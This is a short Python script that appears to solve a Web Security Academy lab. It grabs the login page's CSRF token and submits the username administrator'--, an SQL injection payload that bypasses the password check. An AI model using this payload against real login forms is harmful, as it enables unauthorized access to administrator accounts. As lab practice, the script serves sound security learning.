import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = 'ac071f6e1fc8712a80284b64005b00a4.web-security-academy.net'
url = f'https://{site}/login'

resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : """administrator'--""",
    'password' : """foo"""
}

resp = s.post(url, data=logindata)

soup = BeautifulSoup(resp.text,'html.parser')

if warn := soup.find('p', {'class':'is-warning'}):
    print(warn.text)
else:
    print(resp.text)